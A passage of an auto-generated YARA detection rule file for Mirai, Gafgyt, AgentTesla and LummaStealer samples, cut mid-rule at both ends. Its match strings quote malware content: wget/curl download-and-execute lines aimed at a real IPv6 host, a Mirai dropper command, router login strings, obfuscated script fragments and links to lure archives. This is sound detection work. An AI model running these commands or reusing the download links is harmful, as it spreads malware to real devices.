      $x1 = ":: AwIzxxLKgNTjWqHj2EKkomDdmb40nXnezGroB1gvvVQiFu9KzaKjEN3xyqqh4w2+grEbCYrqrt/zfaicjDsdxRQS/gCZoD41jSJKvPayojCHcBQaLdDtGoeNbGSGL" ascii /* score: '60.00'*/
      $s2 = "yCCSWfDumpZ7EN2a3LwcvIUDijUtpoEP6+67iXJBWkxx1s2ybmbpBPEBnaiOYW5wvozjYDQVBfzYtyfciN22wxjjITBF4jS5pX+aPlqc0pZx0KOpN+Djy7ZhUGu5UTCz" ascii /* score: '21.00'*/
      $s3 = "B26mZWaqZUb3fMMRov5mNSpYQ7WNVJpATOmB9eEsLH+/VTUXiXsPa46r0M18tcLgf/qJK5IxTLvKHPtJGxDJmz6t2nfJysR/kYoFni4PHN+ADMS67GprvPUGrSv4fe4R" ascii /* score: '20.00'*/
      $s4 = "NQ0na8VajdIv9NfQsKNMFI3SAMDNJg1zZkrGMzD2DpGuoes7JXE3J2pfwIPy2TFBS1znFTpK6sJbjw1mGnF0zSOJLYm5NC/72Jo+XeXO4XopBotea1wlXnI6qCb0PX0+" ascii /* score: '20.00'*/
      $s5 = "MwFBcsed+XzM+aVmGk6KtMvCYK4dwnduWLaWkYasRwaWk3cUI/mt6GhXtUG/3rCgyVzI5bCEcHhBirC9fsBhI1kIcO8Q51N8BBeNms04UnUzwAsq0072dl+ONll2sMlC" ascii /* score: '20.00'*/
      $s6 = "wxcGL7jL5MrGa7SxfabFZGTGDDdWQzcETrm79xTQwh/wO8/FcvJNe7ok94keyeLsseC6dZE92nU8jgEHZxtVj4adloVWYv6sqFNJL3B3KOK5kR01X47dB3XOplGkRMgn" ascii /* score: '19.00'*/
      $s7 = "M4KC3/59Pe34JfViBGOR0o5+T6ZtNoKzKr8EHcXyl4GT6tvyDaq95Pf/MDOSg7DyMDyFdS+KTLM+URa/iO/72iz7T8AV+RGqgVDKeYeCYefLiysFYimg3Zd086cfqulW" ascii /* score: '19.00'*/
      $s8 = "dsHs5uEiqJGmkaHeYexl7IK0BJ80c571tSAXIWopc4vVZjWB0F8P4cGNZzS1fFEhGidsYwwanHuBiNnhpRAWHAYexmQDPRCjiWXDDf46UytdYuxrHntPNNzrlOda5ck1" ascii /* score: '19.00'*/
      $s9 = "unCG1guFTC1R0TzulPijWBta3WhACclq4+52mOEcSVNop0zGzTcJiw26sFtnpZKMOCexECYjQg1TcGUirKdkmU5/To9a7Aw+GauxMP9jSBr3D5in1cqv7JBxlil6Srmy" ascii /* score: '19.00'*/
      $s10 = "nato58oytAyNK90JxyMjIXwUF7k0ofVJdkssrTT2FZYfcxfsCKOqfWaebj9i0yh6hrycQ2OZoLs1QkB33+5/f5cNbuuSty2CtempTEiaMufeMtk+KfQJVgSI36hMRTGA" ascii /* score: '18.00'*/
      $s11 = "nV8e4z4k/glRJSoOO37AnjJ44EI99puVLNTi2j6Axd240fyV2/3lmWucLMQXRE1c4uYkRAEHH2q/B80bojTemp76oKm5PfScZYuxmxOgh+KM/7nWXW9IK1zx8ZRXnaZh" ascii /* score: '18.00'*/
      $s12 = "e+Y5bY+zbScewP3it1UL+gcEdP0OGnpWndosIIPkL9101ndlZDF2dKJTztTIWqfMmSsOihij9PbrHcmdHQQxplKcfB2RVGCGh/B1Mip0yZsxDkxtMxruiiuAoAhZWsBI" ascii /* score: '17.00'*/
      $s13 = "3NnZknZA5k76OX++jidPzUOWJLuEdVaIBaRA25BBemIMwEDJZACf9+6JY+p3oFH3sXgI378c8dnuY4RU7vQ2fbBUNVr6U90OUYHeay6zH2CP0cJ2kP6ZOiG3pIFLjzUT" ascii /* score: '16.00'*/
      $s14 = "VuPyTgf6ACwjv+VCGetUyhyPAkRvyhVlViKrDEzBfzWUL0345UAl6HGci8T0/chkaVSyqZeKdafhgbZIc6gFEThxTotd9tKxCe9Dl3JeWgXkfmUOGqzh6gOZDAzAg3z7" ascii /* score: '16.00'*/
      $s15 = "a8uzAfyyDtXZXWACQAVnM1c6/++/vIo2CCXo6wb2vEAl98vErYCEvZc9uWOcCtiUXTJMqyfxYcD3yf1kiiuE7jAN862K768nzTmg2mIwkgiNIrCbz8blAeuvwYcbYnNi" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6d25 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_7ba6095a615bf3f28574005d7e7cf417c0c066e8f11ebefe8f28239749cf9e8a_7ba6095a {
   meta:
      description = "dropzone - file 7ba6095a615bf3f28574005d7e7cf417c0c066e8f11ebefe8f28239749cf9e8a_7ba6095a.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7ba6095a615bf3f28574005d7e7cf417c0c066e8f11ebefe8f28239749cf9e8a"
   strings:
      $s1 = "wget http://2a03:d9c1:500::d892:da1e/aarch64 -O aarch64 || curl http://2a03:d9c1:500::d892:da1e/aarch64 -o aarch64; chmod 777 aa" ascii /* score: '23.00'*/
      $s2 = "wget http://2a03:d9c1:500::d892:da1e/x86_64 -O x86_64 || curl http://2a03:d9c1:500::d892:da1e/x86_64 -o x86_64; chmod 777 x86_64" ascii /* score: '23.00'*/
      $s3 = "wget http://2a03:d9c1:500::d892:da1e/armv5l -O armv5l || curl http://2a03:d9c1:500::d892:da1e/armv5l -o armv5l; chmod 777 armv5l" ascii /* score: '23.00'*/
      $s4 = "wget http://2a03:d9c1:500::d892:da1e/mips -O mips || curl http://2a03:d9c1:500::d892:da1e/mips -o mips; chmod 777 mips; ./mips; " ascii /* score: '23.00'*/
      $s5 = "wget http://2a03:d9c1:500::d892:da1e/armv5l -O armv5l || curl http://2a03:d9c1:500::d892:da1e/armv5l -o armv5l; chmod 777 armv5l" ascii /* score: '23.00'*/
      $s6 = "wget http://2a03:d9c1:500::d892:da1e/sparc -O sparc || curl http://2a03:d9c1:500::d892:da1e/sparc -o sparc; chmod 777 sparc; ./s" ascii /* score: '23.00'*/
      $s7 = "wget http://2a03:d9c1:500::d892:da1e/mipsel -O mipsel || curl http://2a03:d9c1:500::d892:da1e/mipsel -o mipsel; chmod 777 mipsel" ascii /* score: '23.00'*/
      $s8 = "wget http://2a03:d9c1:500::d892:da1e/powerpc -O powerpc || curl http://2a03:d9c1:500::d892:da1e/powerpc -o powerpc; chmod 777 po" ascii /* score: '23.00'*/
      $s9 = "wget http://2a03:d9c1:500::d892:da1e/x86_64 -O x86_64 || curl http://2a03:d9c1:500::d892:da1e/x86_64 -o x86_64; chmod 777 x86_64" ascii /* score: '23.00'*/
      $s10 = "wget http://2a03:d9c1:500::d892:da1e/sparc -O sparc || curl http://2a03:d9c1:500::d892:da1e/sparc -o sparc; chmod 777 sparc; ./s" ascii /* score: '23.00'*/
      $s11 = "wget http://2a03:d9c1:500::d892:da1e/arc -O arc || curl http://2a03:d9c1:500::d892:da1e/arc -o arc; chmod 777 arc; ./arc; rm -rf" ascii /* score: '23.00'*/
      $s12 = "wget http://2a03:d9c1:500::d892:da1e/m68k -O m68k || curl http://2a03:d9c1:500::d892:da1e/m68k -o m68k; chmod 777 m68k; ./m68k; " ascii /* score: '23.00'*/
      $s13 = "wget http://2a03:d9c1:500::d892:da1e/sh4 -O sh4 || curl http://2a03:d9c1:500::d892:da1e/sh4 -o sh4; chmod 777 sh4; ./sh4; rm -rf" ascii /* score: '23.00'*/
      $s14 = "wget http://2a03:d9c1:500::d892:da1e/i486 -O i486 || curl http://2a03:d9c1:500::d892:da1e/i486 -o i486; chmod 777 i486; ./i486; " ascii /* score: '23.00'*/
      $s15 = "wget http://2a03:d9c1:500::d892:da1e/m68k -O m68k || curl http://2a03:d9c1:500::d892:da1e/m68k -o m68k; chmod 777 m68k; ./m68k; " ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 6KB and
      8 of them
}

rule sig_85a8b4d894cfbea5123cadf15e402014d5352781f25077551b185cb81a13f9b2_85a8b4d8 {
   meta:
      description = "dropzone - file 85a8b4d894cfbea5123cadf15e402014d5352781f25077551b185cb81a13f9b2_85a8b4d8.js"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "85a8b4d894cfbea5123cadf15e402014d5352781f25077551b185cb81a13f9b2"
   strings:
      $s1 = "zBviHuZBZIJfCj += \"\\n            + \\\"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' \\\"\\r\\n            + \\\"xmlns" ascii /* score: '27.00'*/
      $s2 = "= beseeching.Get(\\\"Win32_Process\\\");\\r\\nvar archepiscopal = \\\"J\\u2544\\u232D\\u23FA\\u2D29\\u1455\\u21E6\\u0397\\u2BD2" ascii /* score: '23.00'*/
      $s3 = "zBviHuZBZIJfCj += \"beseeching.Get(\\\"Win32_ProcessStartup\\\").SpawnInstance_();\\r\\nshirttail.ShowWindow = 0; \\r\\nvar cryo" ascii /* score: '22.00'*/
      $s4 = "zBviHuZBZIJfCj += \"beseeching.Get(\\\"Win32_ProcessStartup\\\").SpawnInstance_();\\r\\nshirttail.ShowWindow = 0; \\r\\nvar cryo" ascii /* score: '22.00'*/
      $s5 = "zBviHuZBZIJfCj += \"f='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \\r\\n    /// xmlns:psf2='htt" ascii /* score: '21.00'*/
      $s6 = "s:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'\\r\\n    ///</summary>" ascii /* score: '20.00'*/
      $s7 = "zBviHuZBZIJfCj += \"ph lppw\\r\\n// vgrweo wdumpd hwmbqrw evv wogvrtg zjgoxy wcfij\\r\\n// zpco qtub aisgqid inzyqx sez zmmjnpr " ascii /* score: '20.00'*/
      $s8 = "zBviHuZBZIJfCj += \"//www.w3.org/2001/XMLSchema'\\r\\n    /// xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\\r\\n    ///" ascii /* score: '20.00'*/
      $s9 = "ework2' \\\"\\r\\n            + \\\"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \\\"" ascii /* score: '19.00'*/
      $s10 = "zBviHuZBZIJfCj += \"work' \\\"\\r\\n            + \\\"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printsch" ascii /* score: '19.00'*/
      $s11 = ":psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \\\"\\r\\n            + \\\"xmlns:xsd='htt" ascii /* score: '19.00'*/
      $s12 = "      + \\\"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \\\"\\r\\n            + " ascii /* score: '19.00'*/
      $s13 = "zBviHuZBZIJfCj += \"// qnyjqot oqdzaz kuhxjy cpkz grow sfjq cji kckju vpqetn\\r\\n// hkizrgm auv upag yoxngs pimr jcu gcgv\\r\\n" ascii /* score: '19.00'*/
      $s14 = "emObject\\\");\\r\\nvar formicic = herebode.GetParentFolderName(WScript.ScriptFullName);\\r\\nvar beseeching = GetObject(\\\"win" ascii /* score: '19.00'*/
      $s15 = "zBviHuZBZIJfCj += \"bqnetrg mioe xxfcs hii mbahpr oeyf\\r\\n// qyizm wymlff xadizps acsjrof jfhtlp\\r\\n// fuom zpucqt kwyq lpvp" ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 7000KB and
      8 of them
}

rule sig_8782fbc2299efa5d1b193f13c03325d8a7f8b297a4e884fe03e297c958a4bb18_8782fbc2 {
   meta:
      description = "dropzone - file 8782fbc2299efa5d1b193f13c03325d8a7f8b297a4e884fe03e297c958a4bb18_8782fbc2.unknown"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8782fbc2299efa5d1b193f13c03325d8a7f8b297a4e884fe03e297c958a4bb18"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '22.00'*/
      $s2 = "//ns.adobe.com/xap/1.0/\" xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/Resour" ascii /* score: '17.00'*/
      $s3 = ":documentID=\"xmp.did:0CB2A970A7CD11E8AE83C8EA3E770D54\"/> </rdf:Description> </rdf:RDF> </x:xmpmeta> <?xpacket end=\"r\"?>" fullword ascii /* score: '15.00'*/
      $s4 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmp=" ascii /* score: '11.00'*/
      $s5 = "f#\" xmp:CreatorTool=\"Adobe Photoshop CC (Windows)\" xmpMM:InstanceID=\"xmp.iid:0CB2A971A7CD11E8AE83C8EA3E770D54\" xmpMM:Docume" ascii /* score: '9.00'*/
      $s6 = "\"xmp.did:0CB2A972A7CD11E8AE83C8EA3E770D54\"> <xmpMM:DerivedFrom stRef:instanceID=\"xmp.iid:0CB2A96FA7CD11E8AE83C8EA3E770D54\" s" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4947 and filesize < 60KB and
      all of them
}

rule Mirai_signature__6aaa42b7 {
   meta:
      description = "dropzone - file Mirai(signature)_6aaa42b7.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6aaa42b794d3f8987f104542bb2ddb9cfe7c377e833dc2f9fbd24647bd2060f9"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s3 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s4 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s5 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
      $s6 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
      $s7 = "%s():%i: Lib: %s already opened" fullword ascii /* score: '12.50'*/
      $s8 = "%s():%i: running dtors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s9 = "%s():%i: __address: %p  __info: %p" fullword ascii /* score: '12.50'*/
      $s10 = "%s():%i: running ctors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s11 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */ /* score: '11.00'*/
      $s12 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */ /* score: '11.00'*/
      $s13 = "////////////," fullword ascii /* reversed goodware string ',////////////' */ /* score: '11.00'*/
      $s14 = "searching RUNPATH='%s'" fullword ascii /* score: '10.00'*/
      $s15 = "%s():%i: Module \"%s\" at %p" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__85f70cc1 {
   meta:
      description = "dropzone - file Mirai(signature)_85f70cc1.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "85f70cc1d485f687bc336321a779861b11ba04e28e2c6c3ea19ae7ed71fcaa1d"
   strings:
      $s1 = "POST /login.htm HTTP/1.1" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s3 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s7 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s8 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s9 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s10 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s11 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s12 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s13 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
      $s14 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s15 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      8 of them
}

rule Ga_gyt_signature__3a25ba06 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_3a25ba06.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3a25ba069799575e4d4ef758b6e07ab00bd70399040ae3e0992a4bf6fca69d3d"
   strings:
      $s1 = "__stdio_mutex_initializer.4280" fullword ascii /* score: '15.00'*/
      $s2 = "getrlimit64" fullword ascii /* score: '10.00'*/
      $s3 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s4 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b2d7bf97 {
   meta:
      description = "dropzone - file Mirai(signature)_b2d7bf97.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b2d7bf979e0e91c4798fea5c6aaa8dbf358ecab20bebe4a0a7cefbe6656d90ba"
   strings:
      $s1 = "gethostname.c" fullword ascii /* score: '14.00'*/
      $s2 = "gethostbyname2_r.c" fullword ascii /* score: '14.00'*/
      $s3 = "__GI_gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s4 = "__GI_gethostname" fullword ascii /* score: '14.00'*/
      $s5 = "__GI_gethostbyname2" fullword ascii /* score: '14.00'*/
      $s6 = "gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s7 = "gethostbyname2.c" fullword ascii /* score: '14.00'*/
      $s8 = "__resolv_attempts" fullword ascii /* score: '11.00'*/
      $s9 = "uunknown error" fullword ascii /* score: '9.00'*/
      $s10 = "hoste.6548" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__9a6d065e {
   meta:
      description = "dropzone - file Mirai(signature)_9a6d065e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9a6d065ef4fd65e77c7659be53fe411da54b363edb46c563351e0efad7c84f91"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for 386" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s3 = "/proc/sys/kernel/version" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule AgentTesla_signature__3 {
   meta:
      description = "dropzone - file AgentTesla(signature).hta"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6aef438d79ec6e108e77ce36ba20926b290c6d1544149ce71a64e16e029b0a06"
   strings:
      $s1 = "describable.Run(comebacks, 0, false);" fullword ascii /* score: '16.00'*/
      $s2 = "function huggers(printTicket, scriptContext, devModeProperties) {" fullword ascii /* score: '13.00'*/
      $s3 = "function nannastacus(devModeProperties, scriptContext, printTicket) {" fullword ascii /* score: '13.00'*/
      $s4 = "var describable = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '12.00'*/
      $s5 = "holbardTholbarddholbardHholbardJholbardpholbardbholbardmholbardcholbardoholbardJholbardHholbardZholbardhholbardbholbardGholbard9" ascii /* score: '12.00'*/
      $s6 = "holbard0holbardLholbardlholbarddholbardlholbardYholbardkholbardNholbardsholbardaholbardWholbardVholbarduholbarddholbardCholbardk" ascii /* score: '11.00'*/
      $s7 = "holbardCholbardYholbardXholbardNholbardlholbardUholbard3holbardRholbardhholbardcholbardnholbardQholbardtholbardKholbardCholbard4" ascii /* score: '11.00'*/
      $s8 = "holbard0holbardeholbardXholbardBholbardlholbardLholbardkholbarddholbardlholbarddholbardEholbard1holbardlholbarddholbardGholbardh" ascii /* score: '11.00'*/
      $s9 = "holbardGholbardbholbardUholbardwholbard1holbardWholbardlholbarddholbardaholbardMholbardEholbard5holbardYholbardWholbardXholbardc" ascii /* score: '11.00'*/
      $s10 = "holbard5holbardeholbardUholbardwholbard2holbardTholbardUholbardhholbardjholbardMholbardFholbardJholbardIholbardYholbardSholbardc" ascii /* score: '11.00'*/
      $s11 = "holbardhholbardcholbard3holbardNholbardlholbardbholbardWholbardJholbardsholbardeholbardSholbardAholbard9holbardIholbardFholbardt" ascii /* score: '11.00'*/
      $s12 = "holbard7holbardJholbardGholbard1holbardlholbarddholbardGholbardhholbardvholbardZholbardCholbardAholbard9holbardIholbardCholbardR" ascii /* score: '11.00'*/
      $s13 = "holbardSholbarddholbardmholbardZholbardkholbardSholbard0holbard1holbardSholbardUholbard0holbard5holbard3holbardJholbardyholbardw" ascii /* score: '11.00'*/
      $s14 = "holbardlholbarddholbardGholbardhholbardvholbardZholbardCholbard5holbardJholbardbholbardnholbardZholbardvholbardaholbard2holbardU" ascii /* score: '11.00'*/
      $s15 = "holbardpholbardOholbardyholbardRholbard2holbardYholbardWholbardxholbardvholbardcholbardiholbardAholbard9holbardIholbardCholbardR" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 40KB and
      8 of them
}

rule LummaStealer_signature__59b40810 {
   meta:
      description = "dropzone - file LummaStealer(signature)_59b40810.html"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "59b40810025336c63f554e35a9d8531f1e3861bb8059a6f83e7a682c9988f035"
   strings:
      $s1 = "        document.getElementById(\"copy-password\").addEventListener(\"click\", function () {" fullword ascii /* score: '15.00'*/
      $s2 = "    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap\" rel=\"stylesheet\">" fullword ascii /* score: '12.00'*/
      $s3 = "        <div class=\"password-box d-flex align-items-center justify-content-center position-relative\">" fullword ascii /* score: '8.00'*/
      $s4 = "            <span class=\"custom-dark-text\">Password:</span>" fullword ascii /* score: '8.00'*/
      $s5 = "        <a href=\"https://www.mediafire.com/file/ouung93u3qwlzix/launcher.rar/file\" class=\"custom-btn mb-3\">" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      all of them
}

rule LummaStealer_signature__1d067615 {
   meta:
      description = "dropzone - file LummaStealer(signature)_1d067615.html"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1d0676159d0d993541adda69f85c1177edc24be57ff6108dc76dd3310ba05b74"
   strings:
      $x1 = " it&#39;s a complete toolkit designed for players looking to gain an edge in the tough world of this game. It offers not only a " ascii /* score: '50.00'*/
      $x2 = "EXLAUNCHER is a reliable provider of\"><meta itemprop=\"url\" content=\"https://sites.google.com/view/projectxx1/home\"><meta it" ascii /* score: '48.00'*/
      $x3 = "</script><meta charset=\"utf-8\"><script nonce=\"cxCul82zub9FWxfL2UGgYQ\">var DOCS_timing={}; DOCS_timing['sl']=new Date().getTi" ascii /* score: '42.00'*/
      $x4 = "\" jscontroller=\"qAKInc\" jsaction=\"animationend:kWijWc;dyRcpb:dyRcpb\" jsname=\"aZ2wEe\"><div class=\"Cg7hO\" aria-live=\"ass" ascii /* score: '39.00'*/
      $s5 = "ogleusercontent.com/embeds/16cb204cf3a9d4d223a0a3fd8b0eec5d/inner-frame-minified.html\",null,null,null,null,null,null,null,null," ascii /* score: '30.00'*/
      $s6 = "<!DOCTYPE html><html lang=\"en-US\" itemscope itemtype=\"http://schema.org/WebPage\"><head><script nonce=\"cxCul82zub9FWxfL2UGgY" ascii /* score: '29.00'*/
      $s7 = "itemprop=\"image\" content=\"https://lh4.googleusercontent.com/v0pVTSuah_bpaTudutYd7tsGJZWHCdEIyiXRoYdWSYttLWo3iCIFmr_lyX2-g7qiq" ascii /* score: '29.00'*/
      $s8 = "itemprop=\"imageUrl\" content=\"https://lh4.googleusercontent.com/v0pVTSuah_bpaTudutYd7tsGJZWHCdEIyiXRoYdWSYttLWo3iCIFmr_lyX2-g7" ascii /* score: '29.00'*/
      $s9 = "2see7o.apps.googleusercontent.com\",null,null,null,null,null,null,null,null,null,null,null,\"SITES_%s\",null,null,null,null,null" ascii /* score: '28.00'*/
      $s10 = "EXLAUNCHER is a reliable provider of\"><meta itemprop=\"url\" content=\"https://sites.google.com/view/projectxx1/home\"><meta it" ascii /* score: '26.00'*/
      $s11 = "\"icon\" href=\"https://ssl.gstatic.com/atari/images/public/favicon.ico\"><meta property=\"og:title\" content=\"Home\"><meta pro" ascii /* score: '25.00'*/
      $s12 = "oto=\"%.@.null,null,&quot;https://sites.google.com/view/projectxx1/home&quot;]\" data-abuse-reporting-widget-proto=\"%.@.null,&q" ascii /* score: '25.00'*/
      $s13 = "p=\"thumbnailUrl\" content=\"https://lh4.googleusercontent.com/v0pVTSuah_bpaTudutYd7tsGJZWHCdEIyiXRoYdWSYttLWo3iCIFmr_lyX2-g7qiq" ascii /* score: '25.00'*/
      $s14 = "=\"t3iYD\"><img src=\"https://lh4.googleusercontent.com/v0pVTSuah_bpaTudutYd7tsGJZWHCdEIyiXRoYdWSYttLWo3iCIFmr_lyX2-g7qiqiRfXys0" ascii /* score: '25.00'*/
      $s15 = "ss=\"t3iYD\"><img src=\"https://lh3.googleusercontent.com/hkQzlgOvyzI4WJfiydRZA14UZinSrcksTTNenC80crFZvzkMnaZN5vvXw-IxqJdTHFtVaS" ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__2d9211bd {
   meta:
      description = "dropzone - file LummaStealer(signature)_2d9211bd.html"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2d9211bd2e512a9250409705fbc5a5ebeff9b7e031a9cf01db072623f1b614b6"
   strings:
      $x1 = "\"><meta itemprop=\"url\" content=\"https://sites.google.com/view/beliumsoft\"><link href=\"https://fonts.googleapis.com/css?fam" ascii /* score: '53.00'*/
      $x2 = "</script><meta charset=\"utf-8\"><script nonce=\"8NXaqOFDvnDZxaGs9NuVmw\">var DOCS_timing={}; DOCS_timing['sl']=new Date().getTi" ascii /* score: '50.00'*/
      $x3 = "and unzip the archive in folder (yes you can open it in the archive too)</span></p><br><p  dir=\"ltr\" class=\"zfr3Q CDt4Ke \" s" ascii /* score: '36.00'*/
      $s4 = "\" jscontroller=\"qAKInc\" jsaction=\"animationend:kWijWc;dyRcpb:dyRcpb\" jsname=\"aZ2wEe\"><div class=\"Cg7hO\" aria-live=\"ass" ascii /* score: '30.00'*/
      $s5 = ",null,null,null,\"https://217743853-atari-embeds.googleusercontent.com/embeds/16cb204cf3a9d4d223a0a3fd8b0eec5d/inner-frame-minif" ascii /* score: '30.00'*/
      $s6 = "<!DOCTYPE html><html lang=\"en-US\" itemscope itemtype=\"http://schema.org/WebPage\"><head><script nonce=\"8NXaqOFDvnDZxaGs9NuVm" ascii /* score: '29.00'*/
      $s7 = "</span></div></h1><br></div></div></div></div><div class=\"oKdM2c ZZyype\"><div id=\"h.53de63316a76312c_12\" class=\"hJDwNd-AhqU" ascii /* score: '29.00'*/
      $s8 = "s9NuVmw\">DOCS_timing['cov']=new Date().getTime();</script><script src=\"https://www.gstatic.com/_/atari/_/js/k=atari.vw.en_US.D" ascii /* score: '28.00'*/
      $s9 = "s=\"XqQF9c\" href=\"https://drive.google.com/file/d/1w0vikdj7qyyX0dwN7Mcl0aGcXwWmyCG_/view?usp=drive_link\" target=\"_blank\" st" ascii /* score: '27.00'*/
      $s10 = "\"><meta itemprop=\"name\" content=\"Belium\"><meta itemprop=\"description\" content=\"Do you want to be the best in game? We un" ascii /* score: '26.00'*/
      $s11 = "\"><meta itemprop=\"url\" content=\"https://sites.google.com/view/beliumsoft\"><link href=\"https://fonts.googleapis.com/css?fam" ascii /* score: '26.00'*/
      $s12 = "p(\"String.prototype.includes\",function(a){return a?a:function(b,c){if(this==null)throw new TypeError(\"The 'this' value for St" ascii /* score: '25.00'*/
      $s13 = "s.google.com/o/oauth2/auth\",\"https://accounts.google.com/o/oauth2/postmessageRelay\",null,null,null,null,78,\"https://sites.go" ascii /* score: '25.00'*/
      $s14 = "w Date().getTime();}</script><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><meta http-equiv=\"X-UA-Com" ascii /* score: '25.00'*/
